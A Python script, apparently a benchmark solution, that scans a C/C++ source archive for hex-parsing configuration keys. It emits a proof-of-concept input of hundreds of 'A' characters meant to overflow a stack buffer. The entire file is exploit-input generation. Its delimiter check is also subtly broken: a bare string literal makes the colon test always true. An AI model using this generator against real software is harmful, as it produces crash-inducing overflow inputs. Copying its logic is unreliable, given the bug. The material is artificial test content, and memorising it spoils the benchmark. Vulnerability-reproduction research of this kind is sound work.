import os
import tarfile
import re


class Solution:
    def solve(self, src_path: str) -> bytes:
        try:
            code_files = self._load_code_files(src_path)
            key_info = self._find_hex_key(code_files)
            if key_info is None:
                return self._generic_poc()
            key_str, wants_equal, wants_colon, prefix_0x = key_info

            # Choose delimiter based on heuristics
            if wants_equal:
                delim = " = "
            elif wants_colon:
                delim = " : "
            else:
                delim = " "

            # Length chosen to be large enough to overflow typical small stack buffers
            hex_len = 512
            hex_digits = "A" * hex_len

            lines = []
            # Always include digits-only variant
            lines.append(f"{key_str}{delim}{hex_digits}")
            # If code suggests handling an explicit 0x prefix, add that variant too
            if prefix_0x:
                lines.append(f"{key_str}{delim}0x{hex_digits}")

            poc_str = "\n".join(lines) + "\n"
            return poc_str.encode("ascii", errors="ignore")
        except Exception:
            return self._generic_poc()

    def _load_code_files(self, src_path):
        code_files = []
        try:
            with tarfile.open(src_path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    name = m.name
                    lower = name.lower()
                    if not lower.endswith((".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp")):
                        continue
                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    try:
                        data = f.read()
                    except Exception:
                        continue
                    if not data:
                        continue
                    try:
                        text = data.decode("utf-8", errors="ignore")
                    except Exception:
                        text = data.decode("latin-1", errors="ignore")
                    code_files.append((name, text))
        except Exception:
            pass
        return code_files

    def _find_hex_key(self, code_files):
        candidates = []
        cmp_funcs = [
            "strcmp",
            "strncmp",
            "strcasecmp",
            "stricmp",
            "_stricmp",
            "_strnicmp",
        ]
        cmp_patterns = []
        for func in cmp_funcs:
            # func(var, "key")
            pat1 = re.compile(
                rf"{func}\s*\(\s*([A-Za-z_][A-Za-z0-9_]*)\s*,\s*\"([^\"]+)\""
            )
            # func("key", var)
            pat2 = re.compile(
                rf"{func}\s*\(\s*\"([^\"]+)\"\s*,\s*([A-Za-z_][A-Za-z0-9_]*)"
            )
            cmp_patterns.append((pat1, 1, 2))
            cmp_patterns.append((pat2, 2, 1))

        hex_markers = [
            "isxdigit",
            "strtol",
            "strtoul",
            "strtoull",
            "strtoll",
            "parse_hex",
            "fromhex",
            "hex2bin",
            "hextobin",
            "hex_to",
            "tohex",
            "%x",
            "%X",
        ]

        equal_re = re.compile(r"['\"][^'\"\n]*=[^'\"\n]*['\"]")
        colon_re = re.compile(r"['\"][^'\"\n]*:[^'\"\n]*['\"]")

        for filename, text in code_files:
            # Quick filter: only files that mention hex-related tokens
            if (
                "hex" not in text
                and "HEX" not in text
                and "%x" not in text
                and "0x" not in text
                and "isxdigit" not in text
            ):
                continue

            lines = text.splitlines()
            n = len(lines)
            for idx, line in enumerate(lines):
                if '"' not in line:
                    continue
                for pat, key_pos, str_pos in cmp_patterns:
                    for m in pat.finditer(line):
                        key_string = m.group(str_pos)
                        if not key_string:
                            continue
                        cand = self._analyze_key_in_context(
                            lines,
                            idx,
                            key_string,
                            hex_markers,
                            equal_re,
                            colon_re,
                        )
                        if cand is not None:
                            candidates.append(cand)

        if not candidates:
            return None

        # Select the candidate with the highest score, prefer ones with explicit 0x handling
        best = max(
            candidates,
            key=lambda c: (c["score"], 1 if c["prefix_0x"] else 0),
        )
        return (
            best["key"],
            best["wants_equal"],
            best["wants_colon"],
            best["prefix_0x"],
        )

    def _analyze_key_in_context(
        self, lines, idx, key_string, hex_markers, equal_re, colon_re
    ):
        n = len(lines)
        start = max(0, idx)
        end = min(n, idx + 60)
        snippet_lines = lines[start:end]
        snippet_text = "\n".join(snippet_lines)

        hex_score = 0
        for marker in hex_markers:
            if marker in snippet_text:
                hex_score += 1

        if hex_score == 0:
            return None

        near_start = max(0, idx - 10)
        near_end = min(n, idx + 10)
        near_text = "\n".join(lines[near_start:near_end])

        wants_equal = False
        wants_colon = False

        if (
            "'='" in near_text
            or '"="' in near_text
            or "strchr" in near_text and "=" in near_text
            or equal_re.search(near_text) is not None
        ):
            wants_equal = True
        elif (
            "':'" in near_text
            or '":"'
            or "strchr" in near_text and ":" in near_text
            or colon_re.search(near_text) is not None
        ):
            wants_colon = True

        prefix_0x = '"0x"' in snippet_text or '"0X"' in snippet_text

        return {
            "key": key_string,
            "wants_equal": wants_equal,
            "wants_colon": wants_colon,
            "prefix_0x": prefix_0x,
            "score": hex_score,
        }

    def _generic_poc(self) -> bytes:
        # Fallback PoC: just a couple of very long hex-like strings
        hex_len = 768
        hex_digits = "A" * hex_len
        poc_str = "0x" + hex_digits + "\n" + hex_digits + "\n"
        return poc_str.encode("ascii", errors="ignore")